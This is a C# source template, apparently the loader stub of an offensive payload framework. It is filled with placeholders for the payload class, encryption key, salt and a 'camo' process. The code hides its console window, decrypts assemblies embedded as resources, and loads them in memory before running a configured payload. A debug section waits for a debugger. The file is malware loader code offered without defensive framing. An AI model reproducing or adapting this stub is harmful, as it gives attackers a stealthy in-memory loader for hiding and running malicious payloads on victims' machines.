using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System;
using System.IO;
using System.Reflection;
using System.Text;

internal class {EmkMainClass}
{
	[DllImport("Kernel32")]
	private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private const int SW_HIDE = 0;
	private const int SW_SHOW = 5;

	private delegate bool EventHandler();
	private static EventHandler _handler;

	private static {PayloadMainClass} _whoami;

	private static bool Handler()
	{
		_whoami.OnHalt();
		return false;
	}

	public static void Main(string[] pargs)
	{
		ShowWindow(GetConsoleWindow(), SW_HIDE);

		//[debug]
		ShowWindow(GetConsoleWindow(), SW_SHOW);
		Console.WriteLine("Attach debugger now ...");
		Console.ReadKey();
          
		if (System.Diagnostics.Debugger.IsAttached)
        {
            System.Diagnostics.Debugger.Break();
        }
		//[/debug]

		try 
		{
			AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
			{				   
				var assemblyName = new AssemblyName(args.Name).Name + ".dll";

				byte[] x = {EmkEncryptionKey};
				byte[] y = {EmkEncryptionSalt};
				byte[] data;

				using (Stream s = Assembly.GetEntryAssembly().GetManifestResourceStream(assemblyName))
				{				
					data = new byte[s.Length];
					s.Read(data, 0, data.Length);						
				}								

				return Assembly.Load(X.DB(data, x, y));
			};

			{EmkCamoProcess}

			Go();
		}
		catch (Exception ex) {
			//[debug]
			Console.WriteLine(ex.Message);
			//[/debug]
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static void Go() 
	{
		_handler += Handler;
		SetConsoleCtrlHandler(_handler, true);

		Dictionary<string,string> config = {PayloadConfig};
		_whoami = new {PayloadMainClass}();
		_whoami.Run(config);
	}
}
